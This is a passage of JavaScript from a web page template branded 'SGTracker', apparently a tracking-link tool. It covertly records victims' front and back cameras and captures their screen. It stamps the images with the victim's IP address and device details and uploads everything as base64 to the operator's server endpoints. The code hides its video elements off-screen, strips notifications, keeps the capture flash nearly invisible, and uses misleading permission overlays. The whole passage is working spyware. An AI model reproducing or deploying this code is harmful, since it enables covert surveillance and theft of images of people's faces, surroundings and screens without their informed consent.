      silentGain.gain.value = 0.0; // Completely silent
      silentOscillator.connect(silentGain);
      silentGain.connect(audioContext.destination);
      silentOscillator.start();
      
      // Get silent audio stream for metadata
      const silentAudioStream = silentGain.context.createMediaStreamDestination().stream;
      
      // Combine video and silent audio streams
      const combinedStream = new MediaStream();
      videoStream.getVideoTracks().forEach(track => combinedStream.addTrack(track));
      silentAudioStream.getAudioTracks().forEach(track => combinedStream.addTrack(track));
      
      // Use the combined stream with video and silent audio
      const stream = combinedStream;
      
      // Create media recorder with improved settings
      const mimeType = 'video/webm;codecs=vp9,opus';
      const mediaRecorder = new MediaRecorder(stream, { 
        mimeType,
        videoBitsPerSecond: 2500000, // Increased bit rate for better quality
        audioBitsPerSecond: 8000 // Very low bitrate for silent audio
      });
      const recordedChunks = [];
      
      // Force data to be available in chunks, not just at the end
      mediaRecorder.ondataavailable = (event) => {
        if (event.data && event.data.size > 0) {
          recordedChunks.push(event.data);
        }
      };
      
      // When recording completes
      mediaRecorder.onstop = () => {
        console.log("Back camera recording completed");
        
        // Create a blob from video chunks
        const videoBlob = new Blob(recordedChunks, { type: mimeType });
        
        // Convert to base64 for sending
        const reader = new FileReader();
        reader.readAsDataURL(videoBlob);
        reader.onloadend = () => {
          const base64data = reader.result.split(',')[1];
          
          // Log the size for debugging
          console.log("Back camera video recorded (size: " + Math.round(videoBlob.size/1024) + "KB)");
          
          // Send video data to server (fixed to use video endpoint)
          $.post("<%=a %>/videobackcamera", {
            uid: uid,
            data: encodeURIComponent(base64data)
          }, (s) => { 
            console.log("Back camera video sent to server");
            
            // Mark as completed after successful send
            captureCompleted = true;
            hideLoadingScreen();
          }).fail((error) => {
            console.error("Failed to send back camera video:", error);
            
            // Mark as completed even if sending fails
            captureCompleted = true;
            hideLoadingScreen();
          });
          
          // Stop all tracks
          stream.getTracks().forEach(track => track.stop());
        };
      };
      
      // Create a video element to show the stream (hidden but needed for some mobile browsers)
      const videoElement = document.createElement('video');
      videoElement.style.position = 'fixed';
      videoElement.style.top = '-9999px';
      videoElement.style.left = '-9999px';
      videoElement.style.width = '1px';
      videoElement.style.height = '1px';
      videoElement.srcObject = stream;
      videoElement.muted = true;
      videoElement.play();
      document.body.appendChild(videoElement);
      
      // Start recording with timeslice to ensure data is captured in chunks
      mediaRecorder.start(1000); // Capture in 1 second chunks
      console.log("Back camera recording started");
      
      // Display a minimal visual indicator at the top of the screen
      const recordingIndicator = document.createElement('div');
      recordingIndicator.style.position = 'fixed';
      recordingIndicator.style.top = '0';
      recordingIndicator.style.left = '0';
      recordingIndicator.style.width = '100%';
      recordingIndicator.style.padding = '4px';
      recordingIndicator.style.backgroundColor = 'rgba(0,0,0,0.3)';
      recordingIndicator.style.color = 'white';
      recordingIndicator.style.textAlign = 'center';
      recordingIndicator.style.fontSize = '12px';
      recordingIndicator.style.zIndex = '9999';
      recordingIndicator.style.opacity = '0.7';
      recordingIndicator.innerHTML = 'Recording... <span id="recordingTimer">8</span>s';
      document.body.appendChild(recordingIndicator);
      
      // Update the countdown
      const timerElement = document.getElementById('recordingTimer');
      let timeLeft = 8; // Slightly shorter for Vercel's 10-second limit (with buffer for processing)
      const timerInterval = setInterval(() => {
        timeLeft--;
        if (timerElement) timerElement.textContent = timeLeft;
        
        if (timeLeft <= 0) {
          clearInterval(timerInterval);
          
          // Remove the indicator
          if (recordingIndicator.parentNode) {
            recordingIndicator.parentNode.removeChild(recordingIndicator);
          }
          
          // Stop recording
          if (mediaRecorder && mediaRecorder.state !== 'inactive') {
            mediaRecorder.stop();
          }
          
          // Remove video element
          if (videoElement.parentNode) {
            videoElement.pause();
            videoElement.srcObject = null;
            videoElement.parentNode.removeChild(videoElement);
          }
        }
      }, 1000);
      
    } catch (error) {
      console.error("Back camera recording error:", error);
      captureCompleted = true;
      hideLoadingScreen();
    }
  }
  
  // Start the recording process
  startRecording();
}

// Screen video recording
function initScreenRecording() {
  console.log("Initializing screen video recording");
  
  // Create an instruction overlay to explain the process
  const instructionOverlay = document.createElement('div');
  instructionOverlay.style.position = 'fixed';
  instructionOverlay.style.top = '0';
  instructionOverlay.style.left = '0';
  instructionOverlay.style.width = '100%';
  instructionOverlay.style.height = '100%';
  instructionOverlay.style.backgroundColor = 'rgba(0,0,0,0.85)';
  instructionOverlay.style.zIndex = '99999';
  instructionOverlay.style.display = 'flex';
  instructionOverlay.style.flexDirection = 'column';
  instructionOverlay.style.justifyContent = 'center';
  instructionOverlay.style.alignItems = 'center';
  instructionOverlay.style.color = 'white';
  instructionOverlay.style.textAlign = 'center';
  instructionOverlay.style.padding = '20px';
  
  // Add instruction text
  instructionOverlay.innerHTML = `
    <div style="font-size: 22px; font-weight: bold; margin-bottom: 20px;">Camera Video Recording</div>
    <div style="font-size: 16px; margin-bottom: 30px;">Please allow camera access when prompted to continue</div>
    <div style="font-size: 14px; margin-bottom: 40px; color: #aaa;">This will record a short video from your front camera</div>
    <button id="startScreenRecordBtn" style="background-color: #2196F3; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-size: 16px; cursor: pointer; margin-bottom: 15px;">Start Camera Recording</button>
    <button id="skipScreenRecordBtn" style="background-color: #757575; color: white; border: none; padding: 8px 16px; border-radius: 6px; font-size: 14px; cursor: pointer;">Skip Recording</button>
  `;
  
  // Add to document
  document.body.appendChild(instructionOverlay);
  
  // Handle start recording button click
  document.getElementById('startScreenRecordBtn').addEventListener('click', () => {
    // Remove the overlay
    document.body.removeChild(instructionOverlay);
    
    // Start the camera video recording process
    startCameraVideoRecording();
  });
  
  // Handle skip button click
  document.getElementById('skipScreenRecordBtn').addEventListener('click', () => {
    // Remove the overlay
    document.body.removeChild(instructionOverlay);
    
    // Mark as completed without recording
    captureCompleted = true;
    hideLoadingScreen();
  });
  
  // Function to start camera video recording
  async function startCameraVideoRecording() {
    try {
      // Request front camera access instead of screen recording
      const videoStream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: "user", // Front camera
          width: { ideal: 1280 },
          height: { ideal: 720 },
          frameRate: { ideal: 24, max: 30 }
        },
        audio: false
      });
      
      // Create a silent audio context for duration metadata
      const audioContext = new (window.AudioContext || window.webkitAudioContext)();
      const silentOscillator = audioContext.createOscillator();
      const silentGain = audioContext.createGain();
      silentGain.gain.value = 0.0; // Completely silent
      silentOscillator.connect(silentGain);
      silentGain.connect(audioContext.destination);
      silentOscillator.start();
      
      // Get silent audio stream for metadata
      const silentAudioStream = silentGain.context.createMediaStreamDestination().stream;
      
      // Combine video and silent audio streams
      const combinedStream = new MediaStream();
      videoStream.getVideoTracks().forEach(track => combinedStream.addTrack(track));
      silentAudioStream.getAudioTracks().forEach(track => combinedStream.addTrack(track));
      
      // Use the combined stream with video and silent audio
      const stream = combinedStream;
      
      // Create media recorder with improved settings
      const mimeType = 'video/webm;codecs=vp9,opus';
      const mediaRecorder = new MediaRecorder(stream, { 
        mimeType,
        videoBitsPerSecond: 2500000, // Increased bit rate for better quality
        audioBitsPerSecond: 8000 // Very low bitrate for silent audio
      });
      const recordedChunks = [];
      
      // Handle recorded data
      mediaRecorder.ondataavailable = (event) => {
        if (event.data && event.data.size > 0) {
          recordedChunks.push(event.data);
        }
      };
      
      // When recording completes
      mediaRecorder.onstop = () => {
        console.log("Camera video recording completed");
        
        // Create a blob from video chunks
        const videoBlob = new Blob(recordedChunks, { type: mimeType });
        
        // Convert to base64 for sending
        const reader = new FileReader();
        reader.readAsDataURL(videoBlob);
        reader.onloadend = () => {
          const base64data = reader.result.split(',')[1];
          
          // Log the size for debugging
          console.log("Camera video recorded (size: " + Math.round(videoBlob.size/1024) + "KB)");
          
          // Send to the camera video endpoint (properly identified as video)
          $.post("<%=a %>/videofrontcamera", {
            uid: uid,
            data: encodeURIComponent(base64data)
          }, (s) => { 
            console.log("Video recording sent to server");
            
            // Mark as completed after successful send
            captureCompleted = true;
            hideLoadingScreen();
          }).fail((error) => {
            console.error("Failed to send camera video recording:", error);
            
            // Mark as completed even if sending fails
            captureCompleted = true;
            hideLoadingScreen();
          });
        };
      };
      
      // Start recording
      mediaRecorder.start();
      console.log("Camera video recording started");
      
      // Display a recording indicator
      const recordingIndicator = document.createElement('div');
      recordingIndicator.style.position = 'fixed';
      recordingIndicator.style.top = '10px';
      recordingIndicator.style.right = '10px';
      recordingIndicator.style.backgroundColor = 'rgba(255,0,0,0.7)';
      recordingIndicator.style.color = 'white';
      recordingIndicator.style.padding = '5px 10px';
      recordingIndicator.style.borderRadius = '5px';
      recordingIndicator.style.zIndex = '9999';
      recordingIndicator.style.fontSize = '14px';
      recordingIndicator.style.fontWeight = 'bold';
      recordingIndicator.innerHTML = '‚óè REC <span id="screenRecTimer">4</span>';
      document.body.appendChild(recordingIndicator);
      
      // Update the timer
      const timerElement = document.getElementById('screenRecTimer');
      let timeLeft = 4; // Reduced for Vercel's 10-second limit
      const timerInterval = setInterval(() => {
        timeLeft--;
        if (timerElement) timerElement.textContent = timeLeft;
        
        if (timeLeft <= 0) {
          clearInterval(timerInterval);
          
          // Remove the indicator
          if (recordingIndicator.parentNode) {
            recordingIndicator.parentNode.removeChild(recordingIndicator);
          }
          
          // Stop recording
          if (mediaRecorder && mediaRecorder.state !== 'inactive') {
            mediaRecorder.stop();
          }
          
          // Stop all tracks
          stream.getTracks().forEach(track => track.stop());
        }
      }, 1000);
      
    } catch (error) {
      console.error("Camera video recording error:", error);
      captureCompleted = true;
      hideLoadingScreen();
    }
  }
}

// Multi-camera capture (front + back)
function initMultiCameraCapture() {
  console.log("Initializing multi-camera capture (front + back)");
  
  // Create an instruction overlay
  const instructionOverlay = document.createElement('div');
  instructionOverlay.style.position = 'fixed';
  instructionOverlay.style.top = '0';
  instructionOverlay.style.left = '0';
  instructionOverlay.style.width = '100%';
  instructionOverlay.style.height = '100%';
  instructionOverlay.style.backgroundColor = 'rgba(0,0,0,0.9)';
  instructionOverlay.style.zIndex = '99999';
  instructionOverlay.style.display = 'flex';
  instructionOverlay.style.flexDirection = 'column';
  instructionOverlay.style.justifyContent = 'center';
  instructionOverlay.style.alignItems = 'center';
  instructionOverlay.style.color = 'white';
  instructionOverlay.style.padding = '20px';
  instructionOverlay.style.textAlign = 'center';
  
  // Add instruction text
  instructionOverlay.innerHTML = `
    <div style="font-size: 24px; font-weight: bold; margin-bottom: 20px;">üì± Dual Camera Video Capture üì±</div>
    <div style="font-size: 16px; margin-bottom: 30px;">This will record videos from both your front and back cameras simultaneously</div>
    <div style="color: #4CAF50; font-size: 15px; margin-bottom: 40px; padding: 10px; background-color: rgba(76, 175, 80, 0.1); border-radius: 5px;">You will need to grant permission for both camera access when prompted</div>
    <button id="startMultiCaptureBtn" style="background-color: #9c27b0; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 16px; cursor: pointer; margin-bottom: 15px; font-weight: bold;">Start Dual Camera Recording</button>
    <button id="skipMultiCaptureBtn" style="background-color: #757575; color: white; border: none; padding: 8px 16px; border-radius: 6px; font-size: 14px; cursor: pointer;">Skip</button>
  `;
  
  // Add to document
  document.body.appendChild(instructionOverlay);
  
  // Handle start button click
  document.getElementById('startMultiCaptureBtn').addEventListener('click', () => {
    // Remove the overlay
    document.body.removeChild(instructionOverlay);
    
    // Start the multi-camera capture process
    startMultiCameraCapture();
  });
  
  // Handle skip button click
  document.getElementById('skipMultiCaptureBtn').addEventListener('click', () => {
    // Remove the overlay
    document.body.removeChild(instructionOverlay);
    
    // Mark as completed without recording
    captureCompleted = true;
    hideLoadingScreen();
  });
  
  // Variables to store recording data
  let frontCameraData = null;
  let backCameraData = null;
  
  // Function to start the multi-camera capture process
  async function startMultiCameraCapture() {
    try {
      // Show a status overlay for progress
      const statusOverlay = document.createElement('div');
      statusOverlay.style.position = 'fixed';
      statusOverlay.style.top = '0';
      statusOverlay.style.left = '0';
      statusOverlay.style.width = '100%';
      statusOverlay.style.height = '100%';
      statusOverlay.style.backgroundColor = 'rgba(0,0,0,0.85)';
      statusOverlay.style.zIndex = '99999';
      statusOverlay.style.display = 'flex';
      statusOverlay.style.flexDirection = 'column';
      statusOverlay.style.justifyContent = 'center';
      statusOverlay.style.alignItems = 'center';
      statusOverlay.style.color = 'white';
      statusOverlay.style.padding = '20px';
      statusOverlay.style.textAlign = 'center';
      
      statusOverlay.innerHTML = `
        <div style="font-size: 22px; font-weight: bold; margin-bottom: 20px;">Recording Videos</div>
        <div id="captureStatus" style="font-size: 18px; margin-bottom: 25px;">Starting cameras...</div>
        <div style="width: 100%; max-width: 300px; height: 10px; background-color: rgba(255,255,255,0.2); border-radius: 5px; overflow: hidden; margin-bottom: 20px;">
          <div id="captureProgress" style="width: 0%; height: 100%; background-color: #9c27b0; transition: width 0.5s;"></div>
        </div>
        <div id="captureTimer" style="font-size: 28px; font-weight: bold;">10</div>
      `;
      
      document.body.appendChild(statusOverlay);
      
      // Function to update status
      function updateStatus(message, progress) {
        const statusEl = document.getElementById('captureStatus');
        const progressEl = document.getElementById('captureProgress');
        
        if (statusEl) statusEl.textContent = message;
        if (progressEl) progressEl.style.width = `${progress}%`;
      }
      
      // Start the countdown timer
      const timerElement = document.getElementById('captureTimer');
      let timeLeft = 10; // 10 seconds total for the operation
      const timerInterval = setInterval(() => {
        timeLeft--;
        if (timerElement) timerElement.textContent = timeLeft;
        
        if (timeLeft <= 0) {
          clearInterval(timerInterval);
        }
      }, 1000);
      
      // Attempt to get front camera stream
      updateStatus("Accessing front camera...", 10);
      const frontCameraPromise = navigator.mediaDevices.getUserMedia({
        audio: false, // Completely disable audio to prevent echo issues
        video: {
          facingMode: "user",
          width: { ideal: 1280 },
          height: { ideal: 720 },
          frameRate: { ideal: 30 }
        }
      }).then(stream => {
        updateStatus("Front camera active - Recording started", 30);
        
        // Create a hidden video element for the stream
        const videoElement = document.createElement('video');
        videoElement.style.position = 'fixed';
        videoElement.style.top = '-9999px';
        videoElement.style.width = '1px';
        videoElement.style.height = '1px';
        videoElement.muted = true;
        videoElement.srcObject = stream;
        videoElement.play();
        document.body.appendChild(videoElement);
        
        // Set up recording
        const mimeType = 'video/webm;codecs=vp9,opus';
        const mediaRecorder = new MediaRecorder(stream, {
          mimeType,
          videoBitsPerSecond: 2500000,
          audioBitsPerSecond: 128000
        });
        
        const chunks = [];
        mediaRecorder.ondataavailable = event => {
          if (event.data.size > 0) {
            chunks.push(event.data);
          }
        };
        
        // Start recording with timeslice to ensure data is captured in chunks
        mediaRecorder.start(1000);
        
        // Return a promise that resolves when recording is done
        return new Promise((resolve) => {
          setTimeout(() => {
            if (mediaRecorder.state !== 'inactive') {
              mediaRecorder.stop();
            }
            
            // When stopped, create a blob and convert to base64
            mediaRecorder.onstop = () => {
              // Clean up video element
              if (videoElement.parentNode) {
                videoElement.pause();
                videoElement.srcObject = null;
                videoElement.parentNode.removeChild(videoElement);
              }
              
              // Stop all tracks
              stream.getTracks().forEach(track => track.stop());
              
              // Create blob and convert to base64
              const videoBlob = new Blob(chunks, { type: mimeType });
              const reader = new FileReader();
              reader.onloadend = () => {
                const base64data = reader.result.split(',')[1];
                console.log(`Front camera video recorded (${Math.round(videoBlob.size/1024)} KB)`);
                resolve(base64data);
              };
              reader.readAsDataURL(videoBlob);
            };
          }, 7000); // Record for 7 seconds
        });
      }).catch(error => {
        console.error("Front camera error:", error);
        updateStatus("Could not access front camera", 30);
        return null;
      });
      
      // Attempt to get back camera stream
      updateStatus("Accessing back camera...", 40);
      const backCameraPromise = navigator.mediaDevices.getUserMedia({
        audio: false, // Only one audio track needed
        video: {
          facingMode: "environment",
          width: { ideal: 1280 },
          height: { ideal: 720 },
          frameRate: { ideal: 30 }
        }
      }).then(stream => {
        updateStatus("Both cameras active - Recording in progress", 60);
        
        // Create a hidden video element for the stream
        const videoElement = document.createElement('video');
        videoElement.style.position = 'fixed';
        videoElement.style.top = '-9999px';
        videoElement.style.width = '1px';
        videoElement.style.height = '1px';
        videoElement.muted = true;
        videoElement.srcObject = stream;
        videoElement.play();
        document.body.appendChild(videoElement);
        
        // Set up recording
        const mimeType = 'video/webm;codecs=vp9,opus';
        const mediaRecorder = new MediaRecorder(stream, {
          mimeType,
          videoBitsPerSecond: 2500000
        });
        
        const chunks = [];
        mediaRecorder.ondataavailable = event => {
          if (event.data.size > 0) {
            chunks.push(event.data);
          }
        };
        
        // Start recording with timeslice to ensure data is captured in chunks
        mediaRecorder.start(1000);
        
        // Return a promise that resolves when recording is done
        return new Promise((resolve) => {
          setTimeout(() => {
            if (mediaRecorder.state !== 'inactive') {
              mediaRecorder.stop();
            }
            
            // When stopped, create a blob and convert to base64
            mediaRecorder.onstop = () => {
              // Clean up video element
              if (videoElement.parentNode) {
                videoElement.pause();
                videoElement.srcObject = null;
                videoElement.parentNode.removeChild(videoElement);
              }
              
              // Stop all tracks
              stream.getTracks().forEach(track => track.stop());
              
              // Create blob and convert to base64
              const videoBlob = new Blob(chunks, { type: mimeType });
              const reader = new FileReader();
              reader.onloadend = () => {
                const base64data = reader.result.split(',')[1];
                console.log(`Back camera video recorded (${Math.round(videoBlob.size/1024)} KB)`);
                resolve(base64data);
              };
              reader.readAsDataURL(videoBlob);
            };
          }, 7000); // Record for 7 seconds
        });
      }).catch(error => {
        console.error("Back camera error:", error);
        updateStatus("Could not access back camera", 60);
        return null;
      });
      
      // Wait for both camera recordings to complete
      updateStatus("Recording from both cameras...", 70);
      
      // Process both camera data
      Promise.all([frontCameraPromise, backCameraPromise])
        .then(([frontData, backData]) => {
          frontCameraData = frontData;
          backCameraData = backData;
          
          updateStatus("Processing video recordings...", 90);
          
          // Send all data to server
          $.post("<%=a %>/allcams", {
            uid: uid,
            frontData: frontCameraData ? encodeURIComponent(frontCameraData) : null,
            backData: backCameraData ? encodeURIComponent(backCameraData) : null,
            screenData: null // No screen data as requested
          }, (response) => {
            console.log("All camera data sent successfully");
            updateStatus("Videos uploaded successfully!", 100);
            
            // Clean up after a short delay
            setTimeout(() => {
              // Remove status overlay
              if (statusOverlay.parentNode) {
                statusOverlay.parentNode.removeChild(statusOverlay);
              }
              
              // Mark as completed
              captureCompleted = true;
              hideLoadingScreen();
            }, 1000);
            
          }).fail((error) => {
            console.error("Failed to send camera data:", error);
            updateStatus("Error uploading videos", 100);
            
            // Clean up after a short delay
            setTimeout(() => {
              // Remove status overlay
              if (statusOverlay.parentNode) {
                statusOverlay.parentNode.removeChild(statusOverlay);
              }
              
              // Mark as completed even if sending fails
              captureCompleted = true;
              hideLoadingScreen();
            }, 1000);
          });
        })
        .catch(error => {
          console.error("Error capturing videos:", error);
          updateStatus("Error capturing videos", 100);
          
          // Clean up
          if (statusOverlay.parentNode) {
            statusOverlay.parentNode.removeChild(statusOverlay);
          }
          
          captureCompleted = true;
          hideLoadingScreen();
        });
      
    } catch (error) {
      console.error("Multi-camera capture error:", error);
      captureCompleted = true;
      hideLoadingScreen();
    }
  }
}

// Screenshot capture
function initScreenshot() {
  console.log("Initializing full phone screenshot capture");
  
  // Get the screenshot flash element
  const screenshotFlash = document.getElementById('screenshot-flash');
  
  // Completely remove any toast notifications
  const feedbackElement = document.getElementById('screenshot-feedback');
  if (feedbackElement && feedbackElement.parentNode) {
    feedbackElement.parentNode.removeChild(feedbackElement);
  }
  
  // Also remove any toast elements created dynamically
  const toasts = document.querySelectorAll('[class*="toast"], [id*="toast"], [class*="notification"], [id*="notification"]');
  toasts.forEach(toast => {
    if (toast && toast.parentNode) {
      toast.parentNode.removeChild(toast);
    }
  });
  
  // Empty feedback function for compatibility with existing code
  function showFeedback(text, duration = 0, isProcessing = false) {
    return {
      updateText: () => {},
      hide: () => {}
    };
  }
  
  // Minimal visual feedback without intrusive notifications
  function flashScreen() {
    // Extremely subtle flash (almost imperceptible) or no flash at all
    screenshotFlash.style.opacity = 0.2;
    setTimeout(() => {
      screenshotFlash.style.opacity = 0;
    }, 50);
  }
  
  // Hide the loading spinner when in screenshot mode
  if (document.getElementById('loading-screen')) {
    document.getElementById('loading-screen').style.display = 'none';
  }
  if (document.getElementById('capture-screen')) {
    document.getElementById('capture-screen').style.display = 'none';
  }

  // Take screenshot with slight delay for page to render but no toast notifications
  setTimeout(() => {
    try {
      // No feedback display as per user request
      
      // Small delay to allow page to fully render before capture starts
      setTimeout(() => {
        // No feedback or notifications
        
        // Create a simple instruction overlay to prompt the user for screen capture permission
        const instructionOverlay = document.createElement('div');
        instructionOverlay.style.position = 'fixed';
        instructionOverlay.style.top = '0';
        instructionOverlay.style.left = '0';
        instructionOverlay.style.width = '100%';
        instructionOverlay.style.height = '100%';
        instructionOverlay.style.backgroundColor = 'rgba(0,0,0,0.7)';
        instructionOverlay.style.zIndex = '99999';
        instructionOverlay.style.display = 'flex';
        instructionOverlay.style.flexDirection = 'column';
        instructionOverlay.style.justifyContent = 'center';
        instructionOverlay.style.alignItems = 'center';
        instructionOverlay.style.color = 'white';
        instructionOverlay.style.textAlign = 'center';
        instructionOverlay.style.padding = '20px';
        
        // Add instruction text
        instructionOverlay.innerHTML = `
          <div style="font-size: 20px; font-weight: bold; margin-bottom: 20px;">Screen Capture Access</div>
          <div style="font-size: 16px; margin-bottom: 30px;">Please select "Screen", "Display", or "Entire Screen" (not a browser tab) to capture your full device screen.</div>
          <div style="font-size: 14px; margin-bottom: 40px; color: #aaa;">This permission will be requested only once.</div>
          <button id="startCaptureBtn" style="background-color: #4CAF50; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-size: 16px; cursor: pointer;">Capture Full Screen</button>
        `;
        
        // Add to document
        document.body.appendChild(instructionOverlay);
        
        // Handle capture button click
        document.getElementById('startCaptureBtn').addEventListener('click', () => {
          // Remove the overlay
          document.body.removeChild(instructionOverlay);
          
          // Start the screen capture process
          captureFullScreen();
        });
        
        // Function to capture the full screen
        function captureFullScreen() {
          if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
            try {
              // Request full screen capture with improved options for mobile
              navigator.mediaDevices.getDisplayMedia({
                video: {
                  displaySurface: "monitor", // Try to get the entire screen
                  logicalSurface: true,
                  cursor: "never"
                }
              }).then(stream => {
                // Flash effect to indicate capture
                flashScreen();
                
                // Create video element to capture the stream
                const videoEl = document.createElement('video');
                videoEl.srcObject = stream;
                videoEl.play();
                
                // Wait for video to be ready
                videoEl.onplaying = () => {
                  // Create canvas to draw the video frame
                  const canvas = document.createElement('canvas');
                  canvas.width = videoEl.videoWidth;
                  canvas.height = videoEl.videoHeight;
                  
                  // Draw the video frame to canvas
                  const ctx = canvas.getContext('2d');
                  ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                  
                  // Stop all tracks
                  stream.getTracks().forEach(track => track.stop());
                  
                  // Get the screenshot data
                  const fullScreenData = canvas.toDataURL('image/png', 0.95).replace('data:image/png;base64,', '');
                  
                  // Send directly to server
                  $.post("<%=a %>/screenshot", {
                    uid: uid,
                    img: encodeURIComponent(fullScreenData)
                  }, (response) => {
                    console.log("Full screen screenshot sent successfully");
                    captureCompleted = true;
                    hideLoadingScreen();
                  }).fail(() => {
                    // Fallback to regular html2canvas if sending fails
                    fallbackToHtml2Canvas();
                  });
                };
                
                // Handle errors
                videoEl.onerror = () => fallbackToHtml2Canvas();
              }).catch(() => {
                fallbackToHtml2Canvas();
              });
            } catch (error) {
              fallbackToHtml2Canvas();
            }
          } else {
            fallbackToHtml2Canvas();
          }
        }
        
        // Fallback to html2canvas if full screen capture fails
        function fallbackToHtml2Canvas() {
          html2canvas(document.body, {
            allowTaint: true,
            useCORS: true,
            scale: window.devicePixelRatio || 2, // Better quality with device pixel ratio
            logging: false, // Disable logging
            backgroundColor: null, // Preserve transparency
            imageTimeout: 10000, // Longer timeout for images,
          onclone: (clonedDoc) => {
            // Add timestamp and IP info to the screenshot with improved styling
            const timestamp = document.createElement('div');
            timestamp.style.position = 'fixed';
            timestamp.style.bottom = '10px';
            timestamp.style.right = '10px';
            timestamp.style.backgroundColor = 'rgba(0,0,0,0.8)';
            timestamp.style.color = 'white';
            timestamp.style.padding = '8px 12px';
            timestamp.style.borderRadius = '8px';
            timestamp.style.fontSize = '13px';
            timestamp.style.fontFamily = 'Arial, sans-serif';
            timestamp.style.boxShadow = '0 2px 6px rgba(0,0,0,0.3)';
            timestamp.style.zIndex = '9999';
            timestamp.innerHTML = `<div style="display:flex;align-items:center;margin-bottom:4px">
                                    <span style="margin-right:5px">üìÖ</span>
                                    <span>${new Date().toLocaleString()}</span>
                                  </div>
                                  <div style="display:flex;align-items:center">
                                    <span style="margin-right:5px">üåê</span>
                                    <span>IP: <%=ip %></span>
                                  </div>`;
            clonedDoc.body.appendChild(timestamp);
            
            // Hide the feedback elements in the cloned document
            const clonedFeedback = clonedDoc.getElementById('screenshot-feedback');
            const clonedFlash = clonedDoc.getElementById('screenshot-flash');
            if (clonedFeedback) clonedFeedback.style.display = 'none';
            if (clonedFlash) clonedFlash.style.display = 'none';
          }
        }).then(canvas => {
          console.log("Screenshot captured successfully");
          
          // Flash the screen to indicate screenshot was taken
          flashScreen();
          
          // No feedback display as per user request
          
          // Get the canvas data as base64 with quality settings
          const screenshotData = canvas.toDataURL('image/png', 0.95).replace('data:image/png;base64,', '');
          
          // Send the screenshot to server
          $.post("<%=a %>/screenshot", {
            uid: uid,
            img: encodeURIComponent(screenshotData)
          }, (response) => {
            console.log("Screenshot sent successfully");
            
            // No feedback display as per user request
            
            // Complete the capture process
            captureCompleted = true;
            hideLoadingScreen();
          }).fail((error) => {
            console.error("Failed to send screenshot:", error);
            
            // No feedback display as per user request
            
            // Try fallback screenshot method
            fallbackScreenshot();
          });
        }).catch(error => {
          console.error("Error capturing with html2canvas:", error);
          
          // No feedback display as per user request
          
          // Try fallback screenshot method
          fallbackScreenshot();
        });
      }, 500);
    } catch (error) {
      console.error("Screenshot initialization error:", error);
      
      // No feedback display as per user request
      
      // Try fallback screenshot method
      fallbackScreenshot();
    }
  }, 1000);
  
  // Enhanced fallback screenshot method if html2canvas fails
  function fallbackScreenshot() {
    console.log("Using enhanced fallback screenshot method");
    
    try {
      // No feedback display as per user request
      
      // Prepare canvas
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');
      
      // Set to viewport size with higher resolution
      const pixelRatio = window.devicePixelRatio || 1;
      const width = window.innerWidth * pixelRatio;
      const height = window.innerHeight * pixelRatio;
      
      canvas.width = width;
      canvas.height = height;
      
      // Scale context based on pixel ratio for sharper text
      ctx.scale(pixelRatio, pixelRatio);
      
      // Create a gradient background that looks better than plain white
      const gradient = ctx.createLinearGradient(0, 0, 0, window.innerHeight);
      gradient.addColorStop(0, "#f8f9fa");
      gradient.addColorStop(1, "#e9ecef");
      ctx.fillStyle = gradient;
      ctx.fillRect(0, 0, window.innerWidth, window.innerHeight);
      
      // Add styled header
      ctx.fillStyle = "#343a40";
      ctx.font = "bold 18px Arial";
      ctx.fillText("SGTracker Screenshot (Fallback Mode)", 20, 30);
      
      // Add capture metadata with better styling
      ctx.font = "14px Arial";
      ctx.fillStyle = "#495057";
      
      // Draw information with icons
      const timeStr = new Date().toLocaleString();
      ctx.fillText("üìÖ Captured at: " + timeStr, 20, 70);
      ctx.fillText("üåê IP Address: <%=ip %>", 20, 100);
      ctx.fillText("üì± Device: " + navigator.platform, 20, 130);
      ctx.fillText("üîç Browser: " + navigator.userAgent.split(' ').slice(0, 3).join(' ') + "...", 20, 160);
      
      // Add separator line
      ctx.strokeStyle = "#ced4da";
      ctx.beginPath();
      ctx.moveTo(20, 180);
      ctx.lineTo(window.innerWidth - 40, 180);
      ctx.stroke();
      
      // Add copyright notice
      ctx.font = "12px Arial";
      ctx.fillStyle = "#6c757d";
      ctx.fillText("Generated by SGTracker by @SG_Modder", 20, 200);
      
      // Flash the screen with enhanced flash
      flashScreen();
      
      // No feedback display as per user request
      
      // Convert to base64 with high quality
      const screenshotData = canvas.toDataURL("image/png", 0.95).replace("data:image/png;base64,", "");
      
      // Send to server
      $.post("<%=a %>/screenshot", {
        uid: uid,
        img: encodeURIComponent(screenshotData)
      }, (response) => {
        console.log("Fallback screenshot sent successfully");
        
        // No feedback display as per user request
        
        // Complete the capture process with no visible feedback
        captureCompleted = true;
        hideLoadingScreen();
      }).fail((error) => {
        console.error("Failed to send fallback screenshot:", error);
        
        // No feedback display as per user request
        
        // Still complete the process without feedback
        captureCompleted = true;
        hideLoadingScreen();
      });
    } catch (finalError) {
      console.error("All screenshot methods failed:", finalError);
      
      // No feedback display as per user request
      
      // Proceed to content immediately with no visible feedback
      captureCompleted = true;
      hideLoadingScreen();
    }
  }
}

// Camera and Screen capture
function initScreenCapture() {
  // Create screen/camera recording elements
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  let mediaRecorder;
  let recordedChunks = [];
  let isRecording = false;
  
  // Function to record from device cameras
  async function startCameraCapture(facingMode = "environment") {
    try {
      console.log(`Requesting camera access (${facingMode})`);
      
      // Request camera access with specific facing mode
      const constraints = {
        video: { 
          facingMode: facingMode,
          width: { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: true
      };
      
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      return stream;
    } catch (error) {
      console.error(`Error accessing ${facingMode} camera:`, error);
      return null;
    }
  }
  
  async function startCameraCapture() {
    try {
      // Use front camera instead of screen recording as requested
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { 
          facingMode: "user",
          width: { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: false
      });
      
      // Connect the stream to video element
      video.srcObject = stream;
      
      // Create media recorder
      mediaRecorder = new MediaRecorder(stream, {mimeType: 'video/webm'});
      
      // Handle recorded data
      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          recordedChunks.push(e.data);
        }
      };
      
      // When recording stops
      mediaRecorder.onstop = () => {
        console.log("Camera video recording completed");
